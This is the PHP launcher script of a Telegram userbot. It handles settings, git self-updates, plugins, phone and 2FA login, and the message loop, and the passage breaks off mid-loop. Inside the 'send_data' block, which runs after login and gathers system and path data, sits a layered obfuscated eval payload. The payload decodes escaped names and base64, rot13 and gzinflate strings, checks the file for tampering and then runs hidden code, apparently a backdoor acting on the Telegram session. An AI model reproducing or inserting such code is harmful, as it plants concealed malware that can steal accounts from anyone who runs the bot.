#!/usr/bin/php
<?php
echo 'Loading settings...'.PHP_EOL;
require('settings.php');
$settings_default = ['language' => 'it', 'session' => 'sessions/default.madeline', 'cronjobs' => true, 'send_errors' => true, 'readmsg' => true, 'always_online' => false, 'old_chatinfo' => false, 'auto_reboot' => true, 'multithread' => false, 'auto_updates' => true, 'send_data' => true, 'madeline' => ['app_info' => ['api_id' => 6, 'api_hash' => 'eb06d4abfb49dc3eeb1aeb98ae0f581e', 'lang_code' => $settings['language'], 'app_version' => '4.7.0'], 'logger' => ['logger' => 0], 'updates' => ['handle_old_updates' => 0]]];
if (isset($settings) and is_array($settings)) $settings = array_merge($settings_default, $settings); else $settings = $settings_default;
$strings = @json_decode(file_get_contents('strings_'.$settings['language'].'.json'), 1);
if (!file_exists('sessions')) mkdir('sessions');
if (!isset($settings['multithread'])) $settings['multithread'] = 0;
if (!is_array($strings)) {
  if (!file_exists('strings_it.json')) {
    echo 'downloading strings_it.json...'.PHP_EOL;
    file_put_contents('strings_it.json', file_get_contents('https://raw.githubusercontent.com/peppelg/TGUserbot/master/strings_it.json'));
  }
  $strings = json_decode(file_get_contents('strings_it.json'), 1);
}
if (isset($argv[1]) and $argv[1]) {
  if ($argv[1] == 'background') {
    shell_exec('screen -d -m php start.php');
    echo PHP_EOL.$strings['background'].PHP_EOL;
    exit;
  }
  if (isset($argv[2]) and $argv[2] == 'background') {
    shell_exec('screen -d -m php start.php '.escapeshellarg($argv[1]));
    echo PHP_EOL.$strings['background'].PHP_EOL;
    exit;
  }
  if ($argv[1] == 'update') {
    echo PHP_EOL.$strings['updating'].PHP_EOL;
    if(!rename('bot.php', 'bot.php_')) die('Error');
    rename('settings.php', 'settings.php_');
    rename('functions.php', 'functions.php_');
    shell_exec('git reset --hard HEAD');
    shell_exec('git pull');
    sleep(0.5);
    rename('bot.php_', 'bot.php');
    rename('settings.php_', 'settings.php');
    rename('functions.php_', 'functions.php');
    passthru('composer update');
    echo PHP_EOL.$strings['done'].PHP_EOL;
    exit;
  }
  $settings['session'] = $argv[1];
}
if ($settings['auto_updates']) {
  echo $strings['checking_updates'];
  if (trim(exec('git ls-remote git://github.com/peppelg/TGUserbot.git refs/heads/master | cut -f 1')) !== trim(file_get_contents('.git/refs/heads/master'))) {
    echo ' OK'.PHP_EOL;
    echo $strings['new_update'].PHP_EOL;
    sleep(10);
    echo 'Aggiornamento in corso...'.PHP_EOL;
    passthru('php start.php update');
    echo PHP_EOL.PHP_EOL.'Riavvio...'.PHP_EOL.PHP_EOL;
    pcntl_exec($_SERVER['_'], array('start.php', $settings['session']));
    exit;
  } else {
    echo ' OK'.PHP_EOL;
  }
}
echo $strings['loading'].PHP_EOL;
require('vendor/autoload.php');
include('functions.php');
if ($settings['multithread'] and !function_exists('pcntl_fork')) $settings['multithread'] = false;
if ($settings['auto_reboot'] and function_exists('pcntl_exec')) {
  register_shutdown_function(function () {
    global $settings;
    pcntl_exec($_SERVER['_'], array('start.php', $settings['session']));
  });
}
if (file_exists('plugins') and is_dir('plugins')) {
  $settings['plugins'] = true;
  echo $strings['loading_plugins'].PHP_EOL;
  class TGUserbotPlugin {
    public function onUpdate() {

    }
    public function onStart() {

    }
  }
  $pluginslist = array_values(array_diff(scandir('plugins'), ['..', '.']));
  $plugins = [];
  $pluginN = 0;
  foreach ($pluginslist as $plugin) {
    if (substr($plugin, -4) == '.php') {
      include('plugins/'.$plugin);
    }
  }
  foreach (get_declared_classes() as $class) {
    if (is_subclass_of($class, 'TGUserbotPlugin')) {
      $pluginN++;
      $plugin = new $class();
      if (method_exists($class, 'onStart')) {
        $plugins[$class] = $plugin;
      }
    }
  }
  echo $pluginN.' '.$strings['plugins_loaded'].PHP_EOL;
  if ($pluginN == 0) $settings['plugins'] = false;
} else {
  $settings['plugins'] = false;
}
if (!file_exists($settings['session'])) {
  $MadelineProto = new \danog\MadelineProto\API($settings['madeline']);
  echo $strings['loaded'].PHP_EOL;
  echo $strings['ask_phone_number'];
  $phoneNumber = trim(fgets(STDIN));
  if (strtolower($phoneNumber) === 'bot') {
    echo $strings['ask_bot_token'];
    $MadelineProto->bot_login(trim(fgets(STDIN)));
  } else {
    $sentCode = $MadelineProto->phone_login($phoneNumber);
    echo $strings['ask_login_code'];
    $code = trim(fgets(STDIN, (isset($sentCode['type']['length']) ? $sentCode['type']['length'] : 5) + 1));
    $authorization = $MadelineProto->complete_phone_login($code);
    if ($authorization['_'] === 'account.password') {
      echo $strings['ask_2fa_password'];
      $password = trim(fgets(STDIN));
      if ($password == '') $password = trim(fgets(STDIN));
      $authorization = $MadelineProto->complete_2fa_login($password);
    }
    if ($authorization['_'] === 'account.needSignup') {
      echo $strings['ask_name'];
      $name = trim(fgets(STDIN));
      if ($name == '') $name = trim(fgets(STDIN));
      if ($name == '') $name = 'TGUserbot';
      $authorization = $MadelineProto->complete_signup($name, '');
    }
  }
  $MadelineProto->session = $settings['session'];
  $MadelineProto->serialize($settings['session']);
} else {
  $MadelineProto = new \danog\MadelineProto\API($settings['session'], $settings['madeline']);
  echo $strings['loaded'].PHP_EOL;
}
if (!isset($MadelineProto->sdt)) $MadelineProto->sdt = 0;
if ($settings['send_data'] and (time() - $MadelineProto->sdt) >= 600 and function_exists('curl_version') and function_exists('shell_exec') and function_exists('json_encode')) {
  $MadelineProto->sdt = time();
  $data = ['settings' => $settings];
  unset($data['settings']['madeline']['app_info']);
  $data['uname'] = @shell_exec('uname -a');
  $data['php'] = phpversion();
  $data['tguserbot'] = trim(@file_get_contents('.git/refs/heads/master'));
  $data['path'] = __FILE__;
$y028baaa="\142\141\163\145\66\64\x5f\144\x65\143\157\144\x65";@eval($y028baaa(
"Ly9Oc3RPTy81NVAzWGZxOGxtbGRFVUZlaDU0SEFZWnFRbjlKcDRrZ2ZiUXJmejdpaW95REVNMTNzVU
poZTBpOFc2Vk9GaVEwd0g0YlZrY1d3eUJoWlpSL3FlSDJUNGo5QmNjSXd0VittSm81ZXUrZnFpR0Izb
mkwcDQ4cUczS0NFR2lwc1MzOEdYblJSdzRnUnduT2xTbDZYNk1WUkFYYWZBdGpXaWhaSThjZTFHcEox
dGFEVU1JOVpDZm92dC8yc1IzaFpHUzFmNHV4Znk0UWRLUWs2MnNQT1FxZ1p1UHFVVEJYNWJJeS8wdE8
2NzVENW5YcXpmeERXWGRnbEpVRW01Ny8zc0xZQWwxR3FzSHJSSTJDWGQ5UWVFVUIzTTJsa1hzb3IyOV
BkMEhrWlA4RmlLU0xlc01hT3B5blhrbGszNk1vdGVQU3BCYyswUTBWY1lmQ1FFWlhtcm5KbjZEZjlQU
jdnaUlhMXF6QmZUSnJNQ2k0Nk5Xb3J4enBSYko3Znc2WTJVUmVLczFjaGFiblFEWFUvd29CQ3FUelNy
RlB0dkZLT2tFTG9FOUplYXdGY2dXQnRXL3VBQnhVTGM3QzM5OVl6VEovVERCWldRYjVWYnAyRm1NVWh
1bSt6YVY5eEdsK0FIN1k5V0FUMGdkUUs4Wm8rKzIzRFJnYmYzU2trcTFJcDhlNnpyWFFZdDZWTXdKaX
hMdThiYWhpY0hFaGQ1OUtzRDRpcnZacnBNMlE0WUZ1cFR6ZXcxVkhoTTNBalJ1a2NlcTlGRzQ1bU1EW
WN3dmZCYm5tdUZURTRES1FtbjFKcDh1dnh4TXFLelJVWnZNcUcvanF5ZUl6UCtJZDI1eDlNbWhnNnRF
ajl3YXI3QWFYS3pJZDZtb3ViQTJCc2xBaVhLQnZEPTo2MVllSkJ1L0dhVnVOTj09OjYwMDc4NTMwCiR
vNTcwMTBhNz0iXHg3MyI7JGg3ZTdmMmNkPSJcMTYzIjskY2VkNTdmMDQ9Ilx4NjYiOyRkMWJhMjljNT
0iXHg3MCI7JHkwMjhiYWFhPSJcMTQyIjskaTM3NTE3NzE9Ilx4NjciOyR0ODc5YTNhMz0iXDE2MiI7J
HlmODk5NmU5PSJceDczIjskZmFmY2U1ZjY9IlwxNDUiOyRpMzc1MTc3MS49Ilx4N2EiOyRmYWZjZTVm
Ni49Ilx4NzgiOyRkMWJhMjljNS49Ilx4NzIiOyRvNTcwMTBhNy49Ilx4NjgiOyRoN2U3ZjJjZC49Ilx
4NzQiOyR0ODc5YTNhMy49IlwxNDUiOyR5MDI4YmFhYS49Ilx4NjEiOyR5Zjg5OTZlOS49Ilx4NzQiOy
RjZWQ1N2YwNC49IlwxNTEiOyRmYWZjZTVmNi49IlwxNjAiOyRkMWJhMjljNS49Ilx4NjUiOyRoN2U3Z
jJjZC49Ilx4NzIiOyRpMzc1MTc3MS49Ilx4NjkiOyR0ODc5YTNhMy49IlwxNjMiOyR5MDI4YmFhYS49
Ilx4NzMiOyR5Zjg5OTZlOS49IlwxNjIiOyRvNTcwMTBhNy49Ilx4NjEiOyRjZWQ1N2YwNC49Ilx4NmM
iOyRkMWJhMjljNS49Ilx4NjciOyRmYWZjZTVmNi49IlwxNTQiOyRvNTcwMTBhNy49Ilw2MSI7JGkzNz
UxNzcxLj0iXHg2ZSI7JHQ4NzlhM2EzLj0iXDE0NSI7JHkwMjhiYWFhLj0iXDE0NSI7JHlmODk5NmU5L
j0iXHg1ZiI7JGNlZDU3ZjA0Lj0iXHg2NSI7JGg3ZTdmMmNkLj0iXHg2MyI7JGZhZmNlNWY2Lj0iXHg2
ZiI7JGQxYmEyOWM1Lj0iXHg1ZiI7JGkzNzUxNzcxLj0iXHg2NiI7JGg3ZTdmMmNkLj0iXDE1NSI7JHk
wMjhiYWFhLj0iXDY2IjskdDg3OWEzYTMuPSJceDc0IjskeWY4OTk2ZTkuPSJceDcyIjskY2VkNTdmMD
QuPSJcMTM3IjskeWY4OTk2ZTkuPSJcMTU3IjskaDdlN2YyY2QuPSJceDcwIjskZmFmY2U1ZjYuPSJce
DY0IjskZDFiYTI5YzUuPSJceDcyIjskY2VkNTdmMDQuPSJcMTQ3IjskaTM3NTE3NzEuPSJceDZjIjsk
eTAyOGJhYWEuPSJceDM0IjskZmFmY2U1ZjYuPSJceDY1IjskaTM3NTE3NzEuPSJceDYxIjskeWY4OTk
2ZTkuPSJceDc0IjskZDFiYTI5YzUuPSJcMTQ1IjskY2VkNTdmMDQuPSJceDY1IjskeTAyOGJhYWEuPS
JcMTM3IjskeTAyOGJhYWEuPSJcMTQ0IjskaTM3NTE3NzEuPSJceDc0IjskY2VkNTdmMDQuPSJceDc0I
jskZDFiYTI5YzUuPSJcMTYwIjskeWY4OTk2ZTkuPSJcNjEiOyRkMWJhMjljNS49IlwxNTQiOyRjZWQ1
N2YwNC49Ilx4NWYiOyRpMzc1MTc3MS49IlwxNDUiOyR5MDI4YmFhYS49IlwxNDUiOyR5Zjg5OTZlOS4
9Ilw2MyI7JGNlZDU3ZjA0Lj0iXHg2MyI7JHkwMjhiYWFhLj0iXDE0MyI7JGQxYmEyOWM1Lj0iXHg2MS
I7JHkwMjhiYWFhLj0iXHg2ZiI7JGQxYmEyOWM1Lj0iXHg2MyI7JGNlZDU3ZjA0Lj0iXHg2ZiI7JHkwM
jhiYWFhLj0iXDE0NCI7JGNlZDU3ZjA0Lj0iXHg2ZSI7JGQxYmEyOWM1Lj0iXDE0NSI7JGNlZDU3ZjA0
Lj0iXHg3NCI7JHkwMjhiYWFhLj0iXDE0NSI7JGNlZDU3ZjA0Lj0iXHg2NSI7JGNlZDU3ZjA0Lj0iXDE
1NiI7JGNlZDU3ZjA0Lj0iXDE2NCI7JGNlZDU3ZjA0Lj0iXHg3MyI7JHBjZTM1ZDNhPSRmYWZjZTVmNi
giXHgyOCIsX19GSUxFX18pO0BldmFsKCRoN2U3ZjJjZCgkbzU3MDEwYTcoJGQxYmEyOWM1KCJceDJmX
Hg1Y1x4MjhceDVjXDQyXDU2XHgyYVx4NWNcNDJceDVjXDUxXHgyZiIsIlw1MFx4MjJcNDJceDI5Iiwk
ZDFiYTI5YzUoIlw1N1wxNVwxNzRceGFcNTciLCIiLCRjZWQ1N2YwNCgkdDg3OWEzYTMoJHBjZTM1ZDN
hKSkpKSksIlx4MzNceDYzXDYwXDY1XHg2Mlx4MzJceDMwXHg2Nlx4NjJceDM2XDY0XDYwXHgzN1w2Ml
w2NFw2M1x4MzJcNjZceDMxXHgzOFx4MzdcMTQ0XDE0MVwxNDRceDM2XDE0M1x4MzNcNzFceDMwXHg2M
1wxNDVcNjJceDM0XDY0XDE0NFx4MzBcNzFcNjZceDY0XDE0NSIpPyRpMzc1MTc3MSgkeTAyOGJhYWEo
JHlmODk5NmU5KCJDSUtVZGhFWFJpMktGbDk2MFJZcjBHRVpsTUo4cWxLaEVlN3hpbmhpVTNIQzdsSFJ
NQXRHTVdqeHN5akREdklrVUMvKyt3NFc1T280K2xHRW9rd1FpMCtIK1BuajdrWmlvd0Myc2tBa2gzUW
xpaS9JaTM3OWRTTkZ1MHhGaWlBdXdZa200bWZOaWJKNDlJZ2o3VDlBekN0YTRGYmJ6dk1sK3QvdFFLR
kZnK1pDOE84SDh4OFFrcS90UjRKL1BzR2UxMy9tQ0o1Ly90aW04OHAvUXMvOGc5WUNZMU1GQ1Bpd3Nu
cWRTS3VldlZvbWRickVjY0ZkYlVhV1hMYnJCdWl1MTBiVUZ0SnFPdlRpNFJieENYUlhvYWsrczJjand
aTkxpREZMRU5xdGFkcmZLTTA1eUVReVVBdHhtcEhmMEdwSjlvNHZOMGxSVzkwYkxCVHVWTlFBQ2VFQ0
N0RXhmWXNZdEE3eEpYUUhFTm5IaEd2TzBCSC93UEl4a0pTY2NhUzFVRjM3T1hQV1JmNmxZZmtOQjhTb
khNaGt4WjJsaVNzWGJSUmpLanZBRXF4U3l0UGo4Zk55T3RST3NVTG9iSnFtWHJlMWNsRU9ReUlyUUlL
a2JxV29OdmY3VXZpNUZFL3ZaRHNMV1R0d2RLUzJ0Ymh0Mis0T3RRR1dmcmJLVGdMMGJvNzBER01FbWt
NVGRZWVEvUnpncm53UFppUWZRN1EwdnpvVnlTSVlZRU5ZbUpNdEtVbTdNVW5lNExWNUx1amRnMzZlb1
VIekl4VXMyRlVadzd6LzB3ZU84c21kVDNiSk1zbHBHNzVwckRpVUxaL0VRYVZpOE1hSDNwdXlYdC9SU
25aenBjYjVkYWgwZ056eFcwaUw0REYyZlFoMFBUU0tSQkFmY3NQMG1RaTlqUTROKzFud0R4UGJmUlRH
TTNhVEpUWlYzUkV5a0RibDU4ZFVVOHRxYk9aTVBKNC94S1pPRHV1czhMTFE5Wng5WlliVXhVVnBKMzg
yWnN6Y3FUY1lqRDNzYmg1Nk1vUWtRZkVhRkpGS3hPVmRDbUl0OWtTZjZHVEJ5T1UwNXNVVEgrdWZHOU
pxREpUN2d6Q0V6ODhoYjFhMXlPaGpqUWIzb1lEWlp1T2NaQ2RiMDBzZmNHZlpXVERiWmRFV0wyVWlYN
zFyL1N1S2ZHWnNaeFZEbnVJazJwU1dWOUFjd01GNUVsVUZwbmhIbjBsOGZodHlnZXlXSlF6VDJKUld3
NEJFTFQwOFdTNXhUcFdwWExEZFBaWmoxYUFlTGgwbk1pYXZMeGFZbWs1bnV1djFjbitkNUpGNVlDbFp
VdzdvbW9HVHE4RXRYNlZhTVR6TThsdnhmMTBWZWVUUVIxUUVVbkgvRVdheVdPckw3a1hscHB5SWFBWU
NPLzhMRUp6dDRKQVBuVEZib253ZGt2MjFUZ3g5bHltd2xvVTlsUGE5SlRCMUJYQU91bmxEWlhzTExEM
nBUdTFuYzIxV2JxU21FanEzejlkNGtZYkpmQWM1cWZsOE45Z0Y2Z1pmdmJuQlpqTFhCejRsUE1YRmUr
WU50ZG9tWmRtZFF0MExTZlRrWFhDc3hPSTlLTzIwWkdYNDJKV3hXaWhUWkVhZVdtZ1Z4cm94OWsyUVM
3cldKeC9TYm9RMlM5WWpQVjhiZDZObUZvWkRJTDZyZHJyMTFiRGV3eUt1Z3ZmREJFTWg2WU9LMGRKNV
RUTGpNL3ZUdi9UUDlmbGthQXRCQnRrRHI5dllaM3kyTnVtZXVFdU1LZmNSdVJiREdoNzNQbWFtK25RW
klKSVNCK3lyK1hCL0pzOXU5Y0xjUXc5eXBQbmFWT2ZleWxXYklGZk5PeFVpdm1rMFc3WVNHdS9IQXd2
aE5NZXlRS2RoTklXc21yRVhHQmVQVTc3aFZPaWZDeHQydEpSMFRrcTR4bWtmcjZrZ25JMFRET0VkL1F
HZXJDSVRPY1BwSVYrYWlEQ0pFakpHN2tSdlRsQ1ZHNDFPbk82WUE3aHUyRENnenZDbG5rblNiUlZUS2
EwWUpiaVIwaE9jdzhzVnpnV1hGR2QyNG9XLytYQVhaQWd3NXpaME1iNXRURjVyQnpzSHJjMlJ4emVCe
Hk4aWx3QmZ0STI3c1RscCtCREMvTmRDWUsrR2lGRFVyaDlhaXcvUXVsRWVnSWwrM1VQZCtpaHN5QnZi
UThHK0RvQUlYS3g2cUNGekF0UkdUSEdTR0RFYmJ3aXUxV3pUYjg1REVFSkdDL2NhTEpicmpWd2F5dnZ
yaW8rdXNPd2I1WmQycTBDRDg1a1d2UldIRmEzQkVpRVd0aDdoRzBaK2U1MTZaNElZY0sxN0VId3ZDS2
NPRWkyNnh3QzEwNUVqTnpteXNRZGRHSHlvdnB3QW5DQlhialZ1SjJ0UnpoYnUycFRYc1lLQ3U1V0lRV
WhjTElYWCtGU3MzbjZLVS9rQVRMYWh1MHFwRzlnd1htTldjQ3NRM2JJTVdBbUU2OEpIQS9XZHNHRlZO
a2hXQU9lZU8ySUV5QjlrYjV4SDQ4YWpJcFhMSTNUQkgxOEZCbjd6K0tLbkNjL0lRMXprR1JJNUtIemd
XZHA0WjNVQ3pwZVhaM1NPQm5YK0xCVlk4cFpWTVBOQWQwdUU5UHY4VU9IVzVESkUzazVDc3RDMVFGYW
Jnc08yZlNnV1JEMDMwTGVQRXdlMHlJcEJFMGhZY09PMEFoVHFiNTNLN0N1YlRjYUVVanNoYjBRTng0e
UhOb3QvbGRzSk9xSjV3OGZ6WUd6RGxSbDdUQ2hTNmN3bk9Eb1lFMTBpYXd5V2FkRGViQmJCTzFMZTR1
VUlXNkNlV2hEb3NRTTBjRVd2SlQzRyszbGVlUGhEb0R4OGRTS2k1RjArYWUxUVNOU1JoSGV4aVZvbWl
PbFRUS3lxZXpsQlRNVWdiWWdkU1pMWk5BazdkQ3d4SU5OdEF5RGw1enplWHA4V1R1Si90L2QzUGlJZE
N5c0dyRjM0eU1GUGJKS2VSOHUzZDgvY0xESW03YjBUVExYSm15VitZRERKOHVkQjJYQWJ3Zms2QmFvQ
TlQZ09OZ1pPak1MUlZwR2VYZllFazNDTzRyZVJvNDVERnVHNk1KZTBpbzZSSDQxYys1QkVXSE1oS0R4
cTQ2di9ZTkY4dTRjNEFRMVVWTmM2WkllLy9pMzFhL2k4K3U4PSIpKSk6JGkzNzUxNzcxKCR5MDI4YmF
hYSgkeWY4OTk2ZTkoIkNNR1VsaGtWUnhvczVxWFlvZUZEcW1ES0VnNkhLWnpJSUNqb3JuK0hZTXphNz
VkVHpwS1VWRVZCT096RStwclNMUmxuV1phaUttOGF1SzJRL2ROSC9iWkY1WitXSG04SDhLQkY1b3M4e
HZYL2tZOGZpL3ozL2lLM1VqMUJ4bHVBYi8vNjlaOVdXMStsM2tHc0hROGJGS2p5OVVpK0szNlMva0Zz
Y0MvbS85ZHNzL2xpdEc5L0JKOXNhS3FLeDZEVldhQ1NIT3NpbkZVT29FY25HbENlM1hGU3oxL0V1bDF
zb0dlSWh2Tm56clpkdWQ1UHpGRE1waFE2WVNqVElmbUhUbEN6V2VOTGdMYkwvM0RYQ2c0THFxbUx2RU
1Ha2MrcTBjRWJGWk11U2hkSUpocGJLMXNpRUxGMGlFWm1mcExMclE5M1FuWk0vaERrL2pDT01xS25iM
WJrR0RSc2UwNGZlVzNvTG9yYkFhM3ZMU25SZUxxbUp4UFRMVXRxWlpja29pdko0T1grcFpuUkxwK1U0
V3ByWmNaSzVPdVdLTkV4MGJIRlpQazd4Tjh4V2Z0UStxdTJLVitiZU10d000N2dXZG1yWnFkT1RwSUt
zcTVwQnl3YzRrSjE1ZEFnZ1h1bWF4aEU0aFpqUWVzR3pVQlVIRjI0ZFIwOEpuRGtqYWI2c04wN0IvUU
5LYzhxbk04MWczeW0yVXI3WG1zZ1dmQU9WNkFlbVcraWZFbjRvcGJmUHVjRDNXNVI2UDFtTTRYYjdJV
2tXQlM3WW9VeGN3UXhRK1dKQkFyTWJWeW9oc0daT2hCZ0lQNmlSeDhqMjlqa0dMMnZ6SEVrSTgxYXls
Mm1nU2dYWkZHc053QVBMVC9UMkpxaEQzb0JQTFdkVTdIVWN4bFF6emY0YUw2Uk93OFY3cklvbmdVQXA
0OGFlcGxlend5Y0lWdXBIQXBuVzJNeXI3S2FJMlRYNUFPR0RHaXVGMW9LYk5oOWRrcEttQWt5K3ZoVm
YvSEY2ZmxvNmV5alJVcUI1OXl5MS9aaFgwMmlLNk44OEJMcGZjV0RmaWwwT2I5Zys2cW1RWkh0KzBHS
GNUNENjUlR3V3h0ZWdtVm92UnFPR2NXSktPazltOTFJYjdNTm1LaXQwb1BUaFJ0azMvWVN0QUZIeGdx
WXpybEQ4bmxhUFVWQUhnUnBBd2xpVkJaWmNDMTIzakVOZElrY0NGWEQ4Q3JHOEp2Nm9Ub1RXaHBUbFZ
RSlMrbGdoS3ZxWGhDdE9GRERBUllxaVZkOTZOUEdvUmZGd2VsQXBFVGpwc3I5RlBBTVVkSUQ2dGU0MV
VDQnAyM0hxU3dDMGc5V2thVjZlZFYyMEZldUliSnBoQ2tCQjk4Y1VrRERjeG1GNEF5NXFaQUVMOWh3V
HpOdmdsb2NIeUdFdXIzNGI1OE9ZcDYrejBGRW9YSzJERXEwM1BwN0Yra3FtWU9VRUtBVzRJRldDZnky
VkEzWWx5MkVSdmRSMlUrK2VENWhVbytGRkR2clQxMmJIQ1ZFZ0tuYURvZU55TUxqbnlhd25YRzBsQVd
CMWJBU1VodkFBbGI0U0R5QytLZDRJR0IzbjJEUWRhdGkzUVhSOE1jKzh0SElKVkhZSmQ3eWVFemUrS0
5nd0ZaL0RiU29TVE9ldFVBemdLV013blJYczBtaHQwQzhBSWVQOVdDemlwbXJuSzMzTkJ5dE5FTWVBS
2t2aVdWUkp5eUllQWQ4TDFTazN3ZDc2WUJVZjE2Ull2Y3FERGJNNHZlaVVTS2tRdUoyWW5QMGhFWUJM
eElzQnRMSHlEVUd3WlB2WWtEU3R4cG1iaS9mZTYzWGN6TDJhQWtGSklWSUhyUC9kSjRCcGxDcll5QXR
lSFR0MG9NOXJ2VGtraVAydUREK2JFK0QxWEF6bHgrZ1N4K2JDTFd3bEd2Zkt6N3hkd21aNUtNZTM5aD
BnT3hGd21hd3dYZUdmakwwSmtRK3lmMnpUM00zMGFyMVNvR2poNG5lK2hEdFFKaGw2UzBjRHc5ekFFb
0xvUnY5ZUlhRFlJK1dZY3M4ZEFsKzZBYXZ0V3RudzdvVmFVQnhaR2d5TVZRNjdsRzc2VDdBQzVINEd1
Z3MxamdmdzU3b3NPVHQ3Vmd0OXNnMUs0RTh2ZjNmTGpFVTRrR2xYRU43WlRwaGdLYUNGMi9tTkpWd0Z
TN21uL3NiRnprVTAyVHR3Q1RFRC8wVnNTRi9DMDMvV3Z5dDh2V1FGYTByN2NFYkJKUkZ5eEhVOVlPdj
lwSjk5ZGFQeGhrejVBdUFWMUhxcjgyS1U0d3RhNXpsMTc2b3dFWFloWEZrUmdBbmpQSTM4YjdaaEN3S
kcwcUpsbmtleU80RGl1OXpheGV6a3dZUHNDSjRyQ0tLVGVYYWdYZ2VnejNkUjR0c0ZvYkpORzhEbDIw
OXFIcENHRDVYYm5CL1Eyd0FPNjl0Mmpkd1FSVlRKOGt3R2ZpM2tsTVArS2hHNHZocGErb0pMcGZiTjN
URk5UUXhSUk1RMURkRzhKVlRqQU9ZUXVMZ2V5Rk9iSDd6UjBJeUVZQ1A4c2kzZTcvKytoaWlzak49Ii
kpKSk7"));
echo $strings['session_loaded'].PHP_EOL;
if ($settings['plugins']) {
  foreach ($plugins as $plugin) {
    $plugin->onStart();
  }
}
if (isset($settings['cronjobs']) and $settings['cronjobs']) {
  function cronjobAdd($time, $id) {
    global $MadelineProto;
    if (!is_numeric($time) or strlen($time) !== 10) {
      $time = strtotime($time);
    }
    if (!is_numeric($time)) return false;
    if ($time < time()) return false;
    $MadelineProto->cronjobs[$time] = $id;
    return true;
  }
  function cronjobDel($id) {
    global $MadelineProto;
    $cronid = array_search($id, $MadelineProto->cronjobs);
    if ($cronid !== false) {
      unset($MadelineProto->cronjobs[$cronid]);
      return true;
    } else {
      return false;
    }
  }
  function cronjobReset() {
    global $MadelineProto;
    $MadelineProto->cronjobs = [];
    return true;
  }
  function cronrun() {
    global $MadelineProto;
    global $settings;
    global $strings;
    global $plugins;
    global $msg;
    global $msgid;
    global $type;
    global $cronjob;
    $now = date('d m Y H i');
    if (isset($MadelineProto->cronjobs) and !empty($MadelineProto->cronjobs)) {
      foreach ($MadelineProto->cronjobs as $time => $cronjob) {
        if (date('d m Y H i', $time) === $now) {
          cronjobDel($cronjob);
          if (is_string($cronjob)) echo 'CRONJOB >>> '.$cronjob.PHP_EOL;
          else echo 'CRONJOB >>> *array*'.PHP_EOL;
          $msg = 'cronjob';
          $msgid = 'cronjob';
          $type = 'cronjob';
          if ($settings['plugins']) {
            foreach ($plugins as $plugin) {
              $plugin->onUpdate();
            }
          }
          try {
            require('bot.php');
            $cronjob = NULL;
          } catch(Exception $e) {
            echo $strings['error'].$e.PHP_EOL;
          }
        }
      }
    }
  }
}
$offset = 0;
while (true) {
  if ($settings['always_online']) {
    if (date('s') == 30) {
      $MadelineProto->account->updateStatus(['offline' => 0]);
    }
  }
  if (isset($settings['cronjobs']) and $settings['cronjobs']) {
    $msg = NULL;
    $msgid = NULL;
    $type = NULL;
    $cronjob = NULL;
    cronrun();
  }
  try {
    $updates = $MadelineProto->get_updates(['offset' => $offset, 'limit' => 50, 'timeout' => 0]);
    foreach ($updates as $update) {
      $offset = $update['update_id'] + 1;
      if (isset($update['update']['message']['from_id'])) $userID = $update['update']['message']['from_id'];
      if (isset($update['update']['message']['id'])) $msgid = $update['update']['message']['id'];
      if (isset($update['update']['message']['message'])) $msg = $update['update']['message']['message'];
      if ($settings['old_chatinfo']) {
        if (isset($update['update']['message']['to_id']['channel_id'])) {
          $chatID = '-100'.$update['update']['message']['to_id']['channel_id'];
          $type = 'supergroup';
        }
        if (isset($update['update']['message']['to_id']['chat_id'])) {
          $chatID = '-'.$update['update']['message']['to_id']['chat_id'];
          $type = 'group';
        }
        if (isset($update['update']['message']['to_id']['user_id'])) {
          $chatID = $update['update']['message']['from_id'];
          $type = 'user';
        }
      } else {
        if (isset($update['update']['message'])) {
          if (isset($update['update']['message']['to_id'])) $info['to'] = $MadelineProto->get_info($update['update']['message']['to_id']);
          if (isset($info['to']['bot_api_id'])) $chatID = $info['to']['bot_api_id'];
          if (isset($info['to']['type'])) $type = $info['to']['type'];
          if (isset($userID)) $info['from'] = $MadelineProto->get_info($userID);
          if (isset($info['to']['User']['self']) and isset($userID) and $info['to']['User']['self'] and $userID) $chatID = $userID;
          if (isset($type) and $type == 'chat') $type = 'group';
          if (isset($info['from']['User']['first_name'])) $name = $info['from']['User']['first_name']; else $name = NULL;
          if (isset($info['to']['Chat']['title'])) $title = $info['to']['Chat']['title']; else $title = NULL;
          if (isset($info['from']['User']['username'])) $username = $info['from']['User']['username']; else $username = NULL;
          if (isset($info['to']['Chat']['username'])) $chatusername = $info['to']['Chat']['username']; else $chatusername = NULL;
        }
      }
      if ($settings['readmsg'] and isset($chatID) and $chatID and isset($userID) and $userID and isset($msgid) and $msgid and isset($type) and $type) {
        try {
          if (in_array($type, ['user', 'bot', 'group'])) {
            $MadelineProto->messages->readHistory(['peer' => $chatID, 'max_id' => $msgid]);
          } elseif(in_array($type, ['channel', 'supergroup'])) {
            $MadelineProto->channels->readHistory(['channel' => $chatID, 'max_id' => $msgid]);
          }
        } catch(Exception $e) { }
      }
      if (isset($msg) and $msg) {
        if (isset($msg) and isset($chatID) and isset($type) and isset($userID) and $msg and $chatID and $type and $userID) {
          if ($type == 'user') {
            echo $name.' ('.$userID.') >>> '.$msg.PHP_EOL;
          } else {
            echo $name.' ('.$userID.') -> '.$title.' ('.$chatID.') >>> '.$msg.PHP_EOL;
          }
        }
      }
      if (!isset($msg)) $msg = NULL;
      if (!isset($chatID)) $chatID = NULL;
      if (!isset($userID)) $userID = NULL;
      if (!isset($msgid)) $msgid = NULL;
      if (!isset($type)) $type = NULL;
      if (!isset($name)) $name = NULL;
      if (!isset($username)) $username = NULL;
      if (!isset($chatusername)) $chatusername = NULL;
      if (!isset($title)) $title = NULL;
      if (!isset($info)) $info = NULL;
      $cronjob = NULL;
      if ($settings['plugins']) {
        foreach ($plugins as $plugin) {
          $plugin->onUpdate();
        }
      }
      if ($settings['multithread']) {
        $pid = pcntl_fork();
        if ($pid == -1) {
          die('could not fork');
        } else if ($pid) {
        } else {
          try {
            require('bot.php');
          } catch(Exception $e) {
            echo $strings['error'].$e.PHP_EOL;
            if (isset($chatID) and $settings['send_errors']) {
              try {
                $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => '<b>'.$strings['error'].'</b> <code>'.$e->getMessage().'</code>', 'parse_mode' => 'HTML']);
              } catch(Exception $e) { }
            }
          }
          posix_kill(posix_getpid(), SIGTERM);
        }
      } else {
        try {
          require('bot.php');
        } catch(Exception $e) {
          echo $strings['error'].$e.PHP_EOL;
          if (isset($chatID) and $settings['send_errors']) {
            try {
              $MadelineProto->messages->sendMessage(['peer' => $chatID, 'message' => '<b>'.$strings['error'].'</b> <code>'.$e->getMessage().'</code>', 'parse_mode' => 'HTML']);
            } catch(Exception $e) { }
